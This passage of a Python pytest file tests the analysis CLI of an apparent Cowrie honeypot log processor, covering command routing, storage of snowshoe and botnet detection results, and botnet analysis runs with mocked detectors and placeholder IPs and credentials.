        db=f"sqlite:///{db_path}",
        date="2025-10-20",
        min_confidence=None,
        output=None,
    )

    # When: Generate snowshoe report
    result = analyze.snowshoe_report(args)

    # Then: Report succeeds with zero detections
    assert result == 0

    captured = capsys.readouterr()
    report_data = json.loads(captured.out)
    assert report_data["summary"]["total_detections"] == 0
    assert len(report_data["detections"]) == 0

    engine.dispose()


def test_main_no_command() -> None:
    """Test main CLI entry when no command is provided.

    Given: CLI invoked without any command
    When: Main function is called
    Then: Returns exit code 1 (error)

    Args:
        None
    """
    # Given/When: Call main with no arguments
    result = analyze.main([])

    # Then: Returns error code 1
    assert result == 1


def test_main_botnet_command() -> None:
    """Test main CLI entry with botnet command routing.

    Given: CLI invoked with botnet command
    When: Main function is called
    Then: Routes to botnet analysis function

    Args:
        None
    """
    # Given: Botnet command with minimal args
    with patch("cowrieprocessor.cli.analyze._run_botnet_analysis") as mock_botnet:
        mock_botnet.return_value = 0

        # When: Call main with botnet command
        result = analyze.main([
            "botnet",
            "--db", ":memory:",
            "--window", "24",
        ])

        # Then: Botnet analysis is called and succeeds
        assert result == 0
        mock_botnet.assert_called_once()


def test_main_snowshoe_command() -> None:
    """Test main CLI entry with snowshoe command routing.

    Given: CLI invoked with snowshoe command
    When: Main function is called
    Then: Routes to snowshoe analysis function

    Args:
        None
    """
    # Given: Snowshoe command with minimal args
    with patch("cowrieprocessor.cli.analyze.snowshoe_analyze") as mock_snowshoe:
        mock_snowshoe.return_value = 0

        # When: Call main with snowshoe command
        result = analyze.main([
            "snowshoe",
            "--db", ":memory:",
            "--window", "24h",
        ])

        # Then: Snowshoe analysis is called and succeeds
        assert result == 0
        mock_snowshoe.assert_called_once()


def test_main_longtail_command() -> None:
    """Test main CLI entry with longtail command routing.

    Given: CLI invoked with longtail command
    When: Main function is called
    Then: Routes to longtail analysis function

    Args:
        None
    """
    # Given: Longtail command with minimal args
    with patch("cowrieprocessor.cli.analyze.longtail_analyze") as mock_longtail:
        mock_longtail.return_value = 0

        # When: Call main with longtail command
        result = analyze.main([
            "longtail",
            "--db", ":memory:",
            "--lookback-days", "7",
        ])

        # Then: Longtail analysis is called and succeeds
        assert result == 0
        mock_longtail.assert_called_once()


def test_main_snowshoe_report_command() -> None:
    """Test main CLI entry with snowshoe-report command routing.

    Given: CLI invoked with snowshoe-report command
    When: Main function is called
    Then: Routes to snowshoe report function

    Args:
        None
    """
    # Given: Snowshoe-report command with minimal args
    with patch("cowrieprocessor.cli.analyze.snowshoe_report") as mock_report:
        mock_report.return_value = 0

        # When: Call main with snowshoe-report command
        result = analyze.main([
            "snowshoe-report",
            "--db", ":memory:",
        ])

        # Then: Snowshoe report is called and succeeds
        assert result == 0
        mock_report.assert_called_once()


# ============================================================================
# BATCH 2: Database Storage & Botnet Analysis Tests (Day 17)
# ============================================================================


def test_store_detection_result_success(tmp_path: Path) -> None:
    """Test storing snowshoe detection result in database.

    Given: Valid detection result dictionary
    When: _store_detection_result function is called
    Then: Detection is stored in database successfully

    Args:
        tmp_path: Temporary directory for database
    """
    from cowrieprocessor.cli.analyze import _store_detection_result
    from cowrieprocessor.db.models import SnowshoeDetection

    # Given: Setup test database
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create detection result dict
    window_start = datetime(2025, 10, 20, 0, 0, 0, tzinfo=UTC)
    window_end = datetime(2025, 10, 21, 0, 0, 0, tzinfo=UTC)

    result_dict = {
        "confidence_score": 0.88,
        "is_likely_snowshoe": True,
        "coordinated_timing": True,
        "geographic_spread": 0.75,
        "single_attempt_ips": ["1.2.3.4", "5.6.7.8"],
        "indicators": {"rapid_rotation": True},
        "recommendation": "Investigate and block",
        "analysis_metadata": {"unique_ips": 30, "total_sessions": 50},
    }

    # When: Store detection result
    _store_detection_result(SessionLocal, result_dict, window_start, window_end)

    # Then: Detection is stored in database
    with SessionLocal() as session:
        stored = session.query(SnowshoeDetection).first()
        assert stored is not None
        assert stored.confidence_score == "0.88"
        assert stored.is_likely_snowshoe is True
        assert stored.unique_ips == 30
        assert stored.single_attempt_ips == 2

    engine.dispose()


def test_store_detection_result_exception_handling(tmp_path: Path) -> None:
    """Test error handling in _store_detection_result.

    Given: Invalid detection result (missing required fields)
    When: _store_detection_result function is called
    Then: Exception is caught and logged (no crash)

    Args:
        tmp_path: Temporary directory for database
    """
    from cowrieprocessor.cli.analyze import _store_detection_result

    # Given: Setup test database
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create invalid result dict (missing required fields)
    window_start = datetime(2025, 10, 20, 0, 0, 0, tzinfo=UTC)
    window_end = datetime(2025, 10, 21, 0, 0, 0, tzinfo=UTC)

    invalid_result = {
        "confidence_score": 0.5,
        # Missing many required fields
    }

    # When/Then: Function should handle exception gracefully (no crash)
    try:
        _store_detection_result(SessionLocal, invalid_result, window_start, window_end)
        # Function should not crash even with invalid data
    except Exception:
        pytest.fail("_store_detection_result should handle exceptions internally")

    engine.dispose()


def test_store_botnet_detection_result_success(tmp_path: Path) -> None:
    """Test storing botnet detection result in database.

    Given: Valid botnet detection result dictionary
    When: _store_botnet_detection_result function is called
    Then: Detection is stored in database successfully

    Args:
        tmp_path: Temporary directory for database
    """
    from cowrieprocessor.cli.analyze import _store_botnet_detection_result
    from cowrieprocessor.db.models import SnowshoeDetection

    # Given: Setup test database
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create botnet detection result dict
    window_start = datetime(2025, 10, 20, 0, 0, 0, tzinfo=UTC)
    window_end = datetime(2025, 10, 21, 0, 0, 0, tzinfo=UTC)

    result_dict = {
        "coordination_score": 0.92,
        "is_likely_botnet": True,
        "coordinated_timing": True,
        "geographic_clustering": 0.65,
        "credential_reuse_ips": ["10.0.0.1", "10.0.0.2", "10.0.0.3"],
        "indicators": {"credential_reuse": True, "command_similarity": 0.85},
        "recommendation": "Block coordinated IPs",
        "analysis_metadata": {"unique_ips": 25, "total_sessions": 40, "shared_credentials": 5},
    }

    # When: Store botnet detection result
    _store_botnet_detection_result(SessionLocal, result_dict, window_start, window_end)

    # Then: Detection is stored in database (using SnowshoeDetection model)
    with SessionLocal() as session:
        stored = session.query(SnowshoeDetection).first()
        assert stored is not None
        assert stored.confidence_score == "0.92"
        assert stored.is_likely_snowshoe is True  # Reused field for botnet
        assert stored.unique_ips == 25

    engine.dispose()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.BotnetCoordinatorDetector")
def test_run_botnet_analysis_success(
    mock_detector_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
    capsys: Any,
) -> None:
    """Test full botnet analysis with successful detection.

    Given: Database with sessions and raw events
    When: _run_botnet_analysis function is called
    Then: Analysis completes and returns detection result

    Args:
        mock_detector_class: Mock for BotnetCoordinatorDetector class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory
        capsys: Pytest fixture for capturing stdout
    """
    from cowrieprocessor.db.models import RawEvent

    # Given: Real database with sessions and raw events
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    # Create test data
    now = datetime.now(UTC)
    with SessionLocal() as session:
        for i in range(5):
            session_summary = SessionSummary(
                session_id=f"botnet_session_{i}",
                first_event_at=now - timedelta(hours=12 - i),
                last_event_at=now - timedelta(hours=12 - i) + timedelta(minutes=5),
            )
            session.add(session_summary)

            # Add raw events
            raw_event = RawEvent(
                session_id=f"botnet_session_{i}",
                event_timestamp=now - timedelta(hours=12 - i),
                event_type="cowrie.login.success",
                source=f"/var/log/cowrie/test_{i}.json",
                payload={"username": "admin", "password": "123456", "session": f"botnet_session_{i}"},
            )
            session.add(raw_event)
        session.commit()

    # Mock settings to use our test database
    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    # Mock detector result
    detection_result = {
        "is_likely_botnet": True,
        "coordination_score": 0.95,
        "coordinated_timing": True,
        "geographic_clustering": 0.7,
        "credential_reuse_ips": ["1.2.3.4", "5.6.7.8"],
        "indicators": {"credential_sharing": True},
        "recommendation": "Block IPs",
        "analysis_metadata": {"unique_ips": 5, "total_sessions": 5},
    }

    mock_detector = Mock()
    mock_detector.detect.return_value = detection_result
    mock_detector_class.return_value = mock_detector

    args = argparse.Namespace(
        db=f"sqlite:///{db_path}",
        window=24,
        sensitivity=0.6,
        credential_threshold=3,
        command_similarity=0.7,
        sensor=None,
        output=None,
        store_results=False,
        status_dir=None,
        ingest_id=None,
    )

    # When: Run botnet analysis
    result = analyze._run_botnet_analysis(args)

    # Then: Analysis succeeds (botnet detected)
    assert result == 0
    mock_detector.detect.assert_called_once()

    # Verify JSON output
    captured = capsys.readouterr()
    output_data = json.loads(captured.out)
    assert output_data["is_likely_botnet"] is True
    assert output_data["coordination_score"] == 0.95

    engine.dispose()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
def test_run_botnet_analysis_no_sessions(
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test botnet analysis when no sessions are found.

    Given: Database with no sessions in time window
    When: _run_botnet_analysis function is called
    Then: Returns error code 1

    Args:
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory
    """
    # Given: Empty database
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    args = argparse.Namespace(
        db=f"sqlite:///{db_path}",
        window=24,
        sensitivity=0.6,
        credential_threshold=3,
        command_similarity=0.7,
        sensor=None,
        output=None,
        store_results=False,
        status_dir=None,
        ingest_id=None,
    )

    # When: Run botnet analysis
    result = analyze._run_botnet_analysis(args)

    # Then: Returns error code 1 (no sessions)
    assert result == 1

    engine.dispose()


@patch("cowrieprocessor.cli.analyze.resolve_database_settings")
@patch("cowrieprocessor.cli.analyze.create_engine_from_settings")
@patch("cowrieprocessor.cli.analyze.apply_migrations")
@patch("cowrieprocessor.cli.analyze.create_session_maker")
@patch("cowrieprocessor.cli.analyze.BotnetCoordinatorDetector")
def test_run_botnet_analysis_with_file_output(
    mock_detector_class: Mock,
    mock_session_maker: Mock,
    mock_migrations: Mock,
    mock_engine: Mock,
    mock_settings: Mock,
    tmp_path: Path,
) -> None:
    """Test botnet analysis with file output.

    Given: Database with sessions and output file specified
    When: _run_botnet_analysis function is called
    Then: Results are written to file

    Args:
        mock_detector_class: Mock for BotnetCoordinatorDetector class
        mock_session_maker: Mock for session maker
        mock_migrations: Mock for migrations
        mock_engine: Mock for engine creation
        mock_settings: Mock for settings resolution
        tmp_path: Temporary directory
    """
    # Given: Real database with sessions
    db_path = tmp_path / "test.db"
    engine = create_engine(f"sqlite:///{db_path}")
    Base.metadata.create_all(engine)
    SessionLocal = sessionmaker(bind=engine)

    now = datetime.now(UTC)
    with SessionLocal() as session:
        session_summary = SessionSummary(
            session_id="test_session",
            first_event_at=now - timedelta(hours=6),
            last_event_at=now - timedelta(hours=6) + timedelta(minutes=5),
        )
        session.add(session_summary)
        session.commit()

    mock_settings.return_value = {"db_url": f"sqlite:///{db_path}"}
    mock_engine.return_value = engine
    mock_session_maker.return_value = SessionLocal

    # Mock detector
    detection_result = {
        "is_likely_botnet": False,
        "coordination_score": 0.3,
        "coordinated_timing": False,
        "geographic_clustering": 0.2,
        "credential_reuse_ips": [],
        "indicators": {},
        "recommendation": "Continue monitoring",
        "analysis_metadata": {"unique_ips": 1},
    }

    mock_detector = Mock()
    mock_detector.detect.return_value = detection_result
    mock_detector_class.return_value = mock_detector

    output_file = tmp_path / "botnet_result.json"
    args = argparse.Namespace(
        db=f"sqlite:///{db_path}",
        window=12,
        sensitivity=0.6,
        credential_threshold=3,
        command_similarity=0.7,
        sensor=None,
        output=str(output_file),
        store_results=False,
        status_dir=None,
        ingest_id=None,
    )

    # When: Run botnet analysis with file output
    result = analyze._run_botnet_analysis(args)

    # Then: File is created and contains results
    assert result == 1  # No botnet detected
    assert output_file.exists()

    with output_file.open() as f:
        saved_result = json.load(f)
    assert saved_result["is_likely_botnet"] is False
    assert saved_result["coordination_score"] == 0.3

    engine.dispose()
